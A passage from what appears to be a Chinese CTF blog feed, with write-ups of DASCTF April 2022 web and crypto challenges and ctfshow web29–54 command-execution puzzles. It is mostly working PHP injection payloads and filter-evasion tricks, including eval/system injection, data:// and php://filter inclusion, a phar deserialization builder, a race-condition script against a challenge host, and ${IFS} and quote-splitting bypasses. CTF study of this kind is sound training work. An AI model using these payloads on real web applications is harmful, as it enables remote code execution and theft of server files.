src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022DASCTF-Apr/image-20220424230946517.png" alt="image-20220424230946517"></p><p>经过调试我们发现，如果template是{TableBody}，那么经过renderSection，就会调用TestView里的renderTableBody方法</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass TestView extends ListView&#123;    const FILTER_POS_HEADER&#x3D;&#39;header&#39;;    const FILTER_POS_BODY&#x3D;&#39;body&#39;;    public $columns&#x3D;array();        public $rowCssClass&#x3D;array(&#39;odd&#39;,&#39;even&#39;);        public $rowCssClassExpression;        public $rowHtmlOptionsExpression;        public $selectableRows&#x3D;1;    public $data&#x3D;array(1,2,3);    public $filterSelector&#x3D;&#39;&#123;filter&#125;&#39;;        public $filterCssClass&#x3D;&#39;filters&#39;;        public $filterPosition&#x3D;&#39;body&#39;;        public $filter;        public $hideHeader&#x3D;false;            public function renderTableHeader()    &#123;        if(!$this-&gt;hideHeader)        &#123;            echo &quot;&lt;thead&gt;\n&quot;;            if($this-&gt;filterPosition&#x3D;&#x3D;&#x3D;self::FILTER_POS_HEADER)                $this-&gt;renderFilter();            if($this-&gt;filterPosition&#x3D;&#x3D;&#x3D;self::FILTER_POS_BODY)                $this-&gt;renderFilter();            echo &quot;&lt;&#x2F;thead&gt;\n&quot;;        &#125;        elseif($this-&gt;filter!&#x3D;&#x3D;null &amp;&amp; ($this-&gt;filterPosition&#x3D;&#x3D;&#x3D;self::FILTER_POS_HEADER || $this-&gt;filterPosition&#x3D;&#x3D;&#x3D;self::FILTER_POS_BODY))        &#123;            echo &quot;&lt;thead&gt;\n&quot;;            $this-&gt;renderFilter();            echo &quot;&lt;&#x2F;thead&gt;\n&quot;;        &#125;    &#125;        public function renderFilter()    &#123;        if($this-&gt;filter!&#x3D;&#x3D;null)        &#123;            echo &quot;&lt;tr class&#x3D;\&quot;&#123;$this-&gt;filterCssClass&#125;\&quot;&gt;\n&quot;;            echo &quot;&lt;&#x2F;tr&gt;\n&quot;;        &#125;    &#125;        public function renderTableRow($row)    &#123;        $htmlOptions&#x3D;array();        if($this-&gt;rowHtmlOptionsExpression!&#x3D;&#x3D;null)        &#123;            $data&#x3D;$this-&gt;data[$row];            $options&#x3D;$this-&gt;evaluateExpression($this-&gt;rowHtmlOptionsExpression,array(&#39;row&#39;&#x3D;&gt;$row,&#39;data&#39;&#x3D;&gt;$data));            if(is_array($options))                $htmlOptions &#x3D; $options;        &#125;        if($this-&gt;rowCssClassExpression!&#x3D;&#x3D;null)        &#123;            $data&#x3D;$this-&gt;dataProvider-&gt;data[$row];            $class&#x3D;$this-&gt;evaluateExpression($this-&gt;rowCssClassExpression,array(&#39;row&#39;&#x3D;&gt;$row,&#39;data&#39;&#x3D;&gt;$data));        &#125;        elseif(is_array($this-&gt;rowCssClass) &amp;&amp; ($n&#x3D;count($this-&gt;rowCssClass))&gt;0)            $class&#x3D;$this-&gt;rowCssClass[$row%$n];        if(!empty($class))        &#123;            if(isset($htmlOptions[&#39;class&#39;]))                $htmlOptions[&#39;class&#39;].&#x3D;&#39; &#39;.$class;            else                $htmlOptions[&#39;class&#39;]&#x3D;$class;        &#125;    &#125;    public function renderTableBody()    &#123;        $data&#x3D;$this-&gt;data;        $n&#x3D;count($data);        echo &quot;&lt;tbody&gt;\n&quot;;        if($n&gt;0)        &#123;            for($row&#x3D;0;$row&lt;$n;++$row)                $this-&gt;renderTableRow($row);        &#125;        else        &#123;            echo &#39;&lt;tr&gt;&lt;td colspan&#x3D;&quot;&#39;.count($this-&gt;columns).&#39;&quot; class&#x3D;&quot;empty&quot;&gt;&#39;;            echo &quot;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;\n&quot;;        &#125;        echo &quot;&lt;&#x2F;tbody&gt;\n&quot;;    &#125;&#125;</code></pre><p>renderTableBody-&gt;renderTableRow-&gt;evaluateExpression而我们的目的就是调用evaluateExpression里的eval来命令执行</p><pre class="language-none"><code class="language-none">public function evaluateExpression($_expression_,$_data_&#x3D;array())&#123;    if(is_string($_expression_))    &#123;        extract($_data_);        return eval(&#39;return &#39;.$_expression_.&#39;;&#39;);    &#125;    else    &#123;        $_data_[]&#x3D;$this;        return call_user_func_array($_expression_, $_data_);    &#125;&#125;</code></pre><p>要想从renderTableBody到renderTableRow，就要给data赋值，让它不为空</p><p>要想从renderTableRow到evaluateExpression，就要给renderTableRow赋值，让它不为空，而这个值会直接传给evaluateExpression中的eval来执行命令。</p><p>最终payload</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022DASCTF-Apr/image-20220424233833974.png" alt="image-20220424233833974"></p><p>这里是TestView而不是ListView应该是因为继承的问题，子类可以调用父类的方法</p><h2 id="soeasy-php"><a href="#soeasy-php" class="headerlink" title="soeasy_php"></a>soeasy_php</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022DASCTF-Apr/image-20220425155742598.png" alt="image-20220425155742598"></p><p>源码里有个注释的更换头像的按钮，把注释去掉抓一下包</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022DASCTF-Apr/image-20220425155843195.png" alt="image-20220425155843195"></p><p>这里存在两个参数，经过测试发现png这里有任意文件读取</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022DASCTF-Apr/image-20220425161103105.png" alt="image-20220425161103105"></p><p>要用绝对路径，相对路径访问的时候会404</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022DASCTF-Apr/image-20220425161022803.png" alt="image-20220425161022803"></p><p>edit.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpini_set(&quot;error_reporting&quot;,&quot;0&quot;);class flag&#123;    public function copyflag()&#123;        exec(&quot;&#x2F;copyflag&quot;); &#x2F;&#x2F;以root权限复制&#x2F;flag 到 &#x2F;tmp&#x2F;flag.txt，并chown www-data:www-data &#x2F;tmp&#x2F;flag.txt        echo &quot;SFTQL&quot;;    &#125;    public function __destruct()&#123;        $this-&gt;copyflag();    &#125;&#125;function filewrite($file,$data)&#123;        unlink($file);        file_put_contents($file, $data);&#125;if(isset($_POST[&#39;png&#39;]))&#123;    $filename &#x3D; $_POST[&#39;png&#39;];    if(!preg_match(&quot;&#x2F;:|phar|\&#x2F;\&#x2F;|php&#x2F;im&quot;,$filename))&#123;        $f &#x3D; fopen($filename,&quot;r&quot;);        $contents &#x3D; fread($f, filesize($filename));        if(strpos($contents,&quot;flag&#123;&quot;) !&#x3D;&#x3D; false)&#123;            filewrite($filename,&quot;Don&#39;t give me flag!!!&quot;);        &#125;    &#125;    if(isset($_POST[&#39;flag&#39;])) &#123;        $flag &#x3D; (string)$_POST[&#39;flag&#39;];        if ($flag &#x3D;&#x3D; &quot;Give me flag&quot;) &#123;            filewrite(&quot;&#x2F;tmp&#x2F;flag.txt&quot;, &quot;Don&#39;t give me flag&quot;);            sleep(2);            die(&quot;no no no !&quot;);        &#125; else &#123;            filewrite(&quot;&#x2F;tmp&#x2F;flag.txt&quot;, $flag);  &#x2F;&#x2F;不给我看我自己写个flag。        &#125;        $head &#x3D; &quot;uploads&#x2F;head.png&quot;;        unlink($head);        if (symlink($filename, $head)) &#123;            echo &quot;成功更换头像&quot;;        &#125; else &#123;            unlink($filename);            echo &quot;非正常文件，已被删除&quot;;        &#125;;    &#125;&#125;</code></pre><p>看到__destruct这种魔术方法和preg_match里的phar就感觉像一个phar反序列化</p><pre class="language-none"><code class="language-none">class flag&#123;    public function copyflag()&#123;        exec(&quot;&#x2F;copyflag&quot;); &#x2F;&#x2F;以root权限复制&#x2F;flag 到 &#x2F;tmp&#x2F;flag.txt，并chown www-data:www-data &#x2F;tmp&#x2F;flag.txt        echo &quot;SFTQL&quot;;    &#125;    public function __destruct()&#123;        $this-&gt;copyflag();    &#125;&#125;$a &#x3D; new flag();$phar &#x3D; new Phar(&quot;exp.phar&quot;); &#x2F;&#x2F;.phar文件$phar-&gt;startBuffering();$phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;); &#x2F;&#x2F;固定的$phar-&gt;setMetadata($a); $phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();</code></pre><p>然后是条件竞争，</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022DASCTF-Apr/image-20220425185506176.png" alt="image-20220425185506176"></p><pre class="language-none"><code class="language-none">from time import sleepimport requestsimport threadingreq &#x3D; requests.session()url1 &#x3D; &#39;http:&#x2F;&#x2F;7ca1cf4f-a92c-4cf2-997c-d4c7c19f3f39.node4.buuoj.cn:81&#x2F;uploads&#x2F;head.png&#39;url2 &#x3D; &#39;http:&#x2F;&#x2F;7ca1cf4f-a92c-4cf2-997c-d4c7c19f3f39.node4.buuoj.cn:81&#x2F;edit.php&#39;data1 &#x3D; &#123;    &#39;png&#39;: &#39;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;91fd0f2420aed857ed981856761afac6.png&#39;,    &#39;flag&#39;: &#39;&#39;&#125;data2 &#x3D; &#123;    &#39;png&#39;: &#39;&#x2F;tmp&#x2F;flag.txt&#39;,    &#39;flag&#39;: &#39;&#39;&#125;def unlink():    req.post(url2, data1)def symlink():    req.post(url2, data2)if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    for _ in range(10):        t1 &#x3D; threading.Thread(target&#x3D;unlink, args&#x3D;())        t2 &#x3D; threading.Thread(target&#x3D;symlink, args&#x3D;())        t1.start()        t2.start()    while True:        # getflag        flag &#x3D; req.get(url1).text        if &quot;flag&quot; in flag:            print(flag)            break        elif &#39;429&#39; in flag:            sleep(5)            print(&#39;wait!&#39;)</code></pre><p>条件竞争这东西。。。感觉挺玄学的</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022DASCTF-Apr/image-20220425185118218.png" alt="image-20220425185118218"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022DASCTF-Apr/image-20220425185753430.png" alt="image-20220425185753430"></p><h2 id="warmup-java"><a href="#warmup-java" class="headerlink" title="warmup-java"></a>warmup-java</h2><p>java还没学，而且也没找到wp，先留个坑</p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="easy-real"><a href="#easy-real" class="headerlink" title="easy_real"></a>easy_real</h2><p>简单的rsa</p><pre class="language-python" data-language="python"><code class="language-python">import randomimport hashlibflag &#x3D; &#39;xxxxxxxxxxxxxxxxxxxx&#39;key &#x3D; random.randint(1,10)for i in range(len(flag)):crypto +&#x3D; chr(ord(flag[i])^key)m &#x3D; crypto的ascii十六进制e &#x3D; random.randint(1,100)print(hashlib.md5(e))p &#x3D; 64310413306776406422334034047152581900365687374336418863191177338901198608319q &#x3D; xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxn &#x3D; p*qc &#x3D; pow(m,e,n)print(n)print(c)#37693cfc748049e45d87b8c7d8b9aacd#4197356622576696564490569060686240088884187113566430134461945130770906825187894394672841467350797015940721560434743086405821584185286177962353341322088523#c&#x3D;3298176862697175389935722420143867000970906723110625484802850810634814647827572034913391972640399446415991848730984820839735665233943600223288991148186397</code></pre><p>已知p，n，c和e的md5值</p><p>爆破一下得到e=23</p><pre class="language-python" data-language="python"><code class="language-python">import hashlibfor i in range(1,1000000000):    res &#x3D; hashlib.md5(str(i).encode(&quot;utf-8&quot;)).hexdigest()    if res &#x3D;&#x3D; &quot;37693cfc748049e45d87b8c7d8b9aacd&quot;:        print(str(i))        print(res)</code></pre><p>c=3298176862697175389935722420143867000970906723110625484802850810634814647827572034913391972640399446415991848730984820839735665233943600223288991148186397<br>p=64310413306776406422334034047152581900365687374336418863191177338901198608319<br>q=65267138038038699886916162739434586079731613825212388229424706115289974540917<br>e=23</p><p>然后直接抄个rsa的脚本改改就行</p><pre class="language-none"><code class="language-none">import libnumfrom Crypto.Util.number import long_to_bytesc &#x3D; 3298176862697175389935722420143867000970906723110625484802850810634814647827572034913391972640399446415991848730984820839735665233943600223288991148186397n &#x3D; 4197356622576696564490569060686240088884187113566430134461945130770906825187894394672841467350797015940721560434743086405821584185286177962353341322088523# n &#x3D; int(&quot;&quot;,16)e &#x3D; 23# e &#x3D; int(&quot;&quot;,16)q &#x3D; 64310413306776406422334034047152581900365687374336418863191177338901198608319p &#x3D; 65267138038038699886916162739434586079731613825212388229424706115289974540917d &#x3D; libnum.invmod(e, (p - 1) * (q - 1))m &#x3D; pow(c, d, n)  # m 的十进制形式crypto &#x3D; long_to_bytes(m)  # m明文print(crypto.decode(&#39;utf-8&#39;))# key &#x3D; random.randint(0,11)# for i in range(len(crypto)):#  string +&#x3D; chr(ord(crypto[i])^key)for key in range(1,10):    print(&#39;&#39;)    for i in range(len(crypto)):        print(chr(crypto[i]^key),end&#x3D;&#39;&#39;)</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow web</title>
      <link href="/2022/04/24/ctfshow%20web/"/>
      <url>/2022/04/24/ctfshow%20web/</url>
      
        <content type="html"><![CDATA[<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c &#x3D; $_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;system(ls);?c&#x3D;system(&#39;cat f?ag.php&#39;);&#x2F;&#x2F;通配符直接绕</code></pre><h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c &#x3D; $_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;flag|system|php&#x2F;i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;echo &#96;ls&#96;;?c&#x3D;echo &#96;cat f*&#96;;&#x2F;&#x2F;反引号内联执行</code></pre><h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c &#x3D; $_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;&#x2F;i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;echo&#96;ls&#96;;?c&#x3D;echo%09&#96;tac%09fla*&#96;;&#x2F;&#x2F;过滤了空格，但是可以用%09绕过看hint感觉预期解应该是无参数的rce ?c&#x3D;readfile(array_rand(array_flip(scandir(current(localeconv())))));?c&#x3D;show_source(next(array_reverse(scandir(current(localeconv())))));</code></pre><h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c &#x3D; $_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;|\&#96;|echo|\;|\(&#x2F;i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;include%0a$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php  &#x2F;&#x2F;php的最后一行代码可以不用分号分行c&#x3D;?&gt;&lt;?&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&#x2F;&#x2F;用短标签再写段php也一样</code></pre><p>php伪协议通常用于文件包含中，php中文件包含的函数有很多，比如 include include、require、include_once、require_once、highlight_file、show_source、file_get_contents、fopen、file、readfile</p><p>还可以用data伪协议</p><p>data伪协议就是把一些体量比较小的数据直接嵌入在页面里，而不使用外部链接。<code>data:text/plain</code>是嵌入文本</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424163928570.png" alt="image-20220424163928570"></p><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">get传参?c&#x3D;include%0a$_POST[1]?&gt;post内容1&#x3D;data:text&#x2F;plain,&lt;?php system(&#39;cat flag*&#39;);</code></pre><p>官方payload</p><pre class="language-php" data-language="php"><code class="language-php">c&#x3D;$nice&#x3D;include$_GET[&quot;url&quot;]?&gt;&amp;url&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&#x2F;&#x2F;感觉中间这个nice没啥用</code></pre><h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><p>同32</p><h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><p>同32</p><h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><p>同32</p><h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><p>同32，就是注意不要用数字当参数名</p><h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;&#x2F;flag in flag.phperror_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c &#x3D; $_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;        include($c);        echo $flag;        &#125;        &#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>直接data伪协议读取</p><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;data:text&#x2F;plain,&lt;?php system(&#39;cat fla*&#39;);</code></pre><h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;&#x2F;flag in flag.phperror_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c &#x3D; $_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;flag|php|file&#x2F;i&quot;, $c))&#123;        include($c);        echo $flag;        &#125;        &#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>data伪协议加短标签</p><pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;data:text&#x2F;plain,&lt;?&#x3D;system(&#39;cat fla*&#39;);</code></pre><p>至于利用日志文件的部分，不知道为什么只有用短标签的时候才能成功</p><p>首先用bp避免箭头符号的转义（这里也是只有作为c的值且用短标签的时候才会不转义，web37也一样</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424172239712.png" alt="image-20220424172239712"></p><p>然后利用文件包含访问nginx的日志文件/var/log/nginx/access.log</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424172302924.png" alt="image-20220424172302924"></p><h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;&#x2F;flag in flag.phperror_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c &#x3D; $_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;        include($c.&quot;.php&quot;);    &#125;        &#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>尖括号闭合掉后面的.php就行了</p><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;data:text&#x2F;plain,&lt;?php system(&#39;cat fla*&#39;);?&gt;</code></pre><h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 06:03:36# @email: h1xa@ctfer.com# @link: https:&#x2F;&#x2F;ctfer.com*&#x2F;if(isset($_GET[&#39;c&#39;]))&#123;    $c &#x3D; $_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;[0-9]|\~|\&#96;|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\&#x3D;|\+|\&#123;|\[|\]|\&#125;|\:|\&#39;|\&quot;|\,|\&lt;|\.|\&gt;|\&#x2F;|\?|\\\\&#x2F;i&quot;, $c))&#123;        eval($c);    &#125;        &#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>payload</p><p>可以用无参数rce，因为这里过滤的是中文的括号</p><pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));</code></pre><p>或者利用session,但是</p><pre class="language-php" data-language="php"><code class="language-php">利用session_id()让php读取我们设置的cookie（session默认不使用所以加了session_start()让php开始使用session）受php版本影响 5.5 -7.1.9均可以执行，因为session_id规定为0-9，a-z,A-Z,-中的字符。在5.5以下及7.1以上均无法写入除此之外的内容。但是符合要求的字符还是可以的</code></pre><p>所以题目环境能做到的也就只有个ls和whoami之类的命令</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424175319501.png" alt="image-20220424175319501"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424175412309.png" alt="image-20220424175412309"></p><p>本来还可以利用base64，但是题目把数字也过滤了，不能进行解码，只能用本地环境复现了</p><p>我这里直接贴了其他师傅的图片了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/b041616efce14720b67c1b942dc4eded.png" alt="在这里插入图片描述"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/4f4e320ad873468aa563357f66b0ac13.png" alt="在这里插入图片描述"></p><p><strong>还有一种姿势</strong></p><pre class="language-none"><code class="language-none">get_defined_vars() 返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。array_pop() 是删除并返回数组最后一个元素current() 返回数组中的当前元素的值。next() 返回数组中的下一个元素的值。</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424180340722.png" alt="image-20220424180340722"></p><p>我们用current()可以获取到GET数组，用next()可以获取到POST数组，然后用array_pop()取出POST数组里面的元素，最后用eval执行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424180605396.png" alt="image-20220424180605396"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424180751358.png" alt="image-20220424180751358"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424180829456.png" alt="image-20220424180829456"></p><h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><p>或运算绕过，直接用羽师傅的脚本也行。</p><p>不过要是直接输payload要在bp里，应该是hackbar的编码有点问题</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424182050495.png" alt="image-20220424182050495"></p><h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><pre class="language-none"><code class="language-none">&lt;?phpif(isset($_GET[&#39;c&#39;]))&#123;  $c&#x3D;$_GET[&#39;c&#39;];  system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);&#125;else&#123;  highlight_file(__FILE__);&#125;</code></pre><p>&gt; 代表重定向到哪里<br>/dev/null 代表空设备文件<br>2&gt; 表示stderr标准错误<br>&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1<br>1 表示stdout标准输出，系统默认值是1，所以&gt;/dev/null等同于 1&gt;/dev/null<br>因此，&gt;/dev/null 2&gt;&amp;1 也可以写成1&gt; /dev/null 2&gt; &amp;1</p><p>本题语句执行过程为：<br>1&gt;/dev/null ：首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，不显示任何信息。<br>2&gt;&amp;1 ： 接着，标准错误输出重定向到标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。</p><p>补充：<br>0表示键盘输入，1表示屏幕输出，2表示错误输出！<br>‘ &gt; ’ 默认标准输出重定向，与1&gt;相同<br>2&gt;&amp;1 意思是把标准错误输出重定向到标准输出<br>&amp;&gt;file 意思是把标准输出和标准错误输出都重定向到文件file中</p><p>利用%0a换行把它换下去或者其他的语句来截断</p><pre class="language-none"><code class="language-none">?c&#x3D;cat flag.php%0a?c&#x3D;cat flag.php||?c&#x3D;cat flag.php%26?c&#x3D;cat flag.php%26%26?c&#x3D;cat flag.php;</code></pre><h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><pre class="language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phpif(isset($_GET[&#39;c&#39;]))&#123;    $c&#x3D;$_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;\;|cat&#x2F;i&quot;, $c))&#123;        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>payload基本上和42的一样，就是把cat换成uniq，tac，nl之类的</p><h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpif(isset($_GET[&#39;c&#39;]))&#123;    $c&#x3D;$_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;;|cat|flag&#x2F;i&quot;, $c))&#123;        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>flag也被过滤了，那就在web43的基础上加上通配符</p><h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><p>空格也被过滤了</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpif(isset($_GET[&#39;c&#39;]))&#123;    $c&#x3D;$_GET[&#39;c&#39;];    if(!preg_matchd(&quot;&#x2F;\;|cat|flag| &#x2F;i&quot;, $c))&#123;        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>用${IFS}替代空格</p><pre class="language-php" data-language="php"><code class="language-php">c&#x3D;nl$&#123;IFS&#125;f*||</code></pre><h2 id="web46-51"><a href="#web46-51" class="headerlink" title="web46-51"></a>web46-51</h2><pre class="language-none"><code class="language-none">&lt;?phpif(isset($_GET[&#39;c&#39;]))&#123;    $c&#x3D;$_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\\$|\*&#x2F;i&quot;, $c))&#123;        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>用&lt;或&lt;&gt;代替空格，用‘’截断flag关键字</p><pre class="language-none"><code class="language-none">c&#x3D;nl&lt;&gt;fla&#39;&#39;g.php||</code></pre><p><strong>web47</strong></p><p>和46一样的</p><pre class="language-php" data-language="php"><code class="language-php">nl&lt;&gt;fla&#39;&#39;g.php||</code></pre><p><strong>web48</strong></p><p>同46</p><pre class="language-none"><code class="language-none">more:一页一页的显示档案内容less:与 more 类似 head:查看头几行tac:从最后一行开始显示，可以看出 tac 是cat 的反向显示tail:查看尾几行nl：显示的时候，顺便输出行号od:以二进制的方式读取档案内容vi:一种编辑器，这个也可以查看vim:一种编辑器，这个也可以查看sort:可以查看uniq:可以查看 file -f:报错出具体内容 grep:在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *filestrings</code></pre><p><strong>web49</strong></p><p>同46</p><p>这个也行</p><pre class="language-none"><code class="language-none">?c&#x3D;nl%09fl&quot;&quot;ag.php%0a</code></pre><p><strong>web50</strong></p><p>同46</p><p><strong>web51</strong></p><p>同46</p><h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><p>过滤了大于小于，但是没过滤$符</p><pre class="language-none"><code class="language-none">?c&#x3D;nl$&#123;IFS&#125;fla&#39;&#39;g.php||</code></pre><h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpif(isset($_GET[&#39;c&#39;]))&#123;    $c&#x3D;$_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;        echo($c);        $d &#x3D; system($c);        echo &quot;&lt;br&gt;&quot;.$d;    &#125;else&#123;        echo &#39;no&#39;;    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;nl$&#123;IFS&#125;fla&#39;&#39;g.php</code></pre><h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><pre class="language-none"><code class="language-none">&lt;?phpif(isset($_GET[&#39;c&#39;]))&#123;    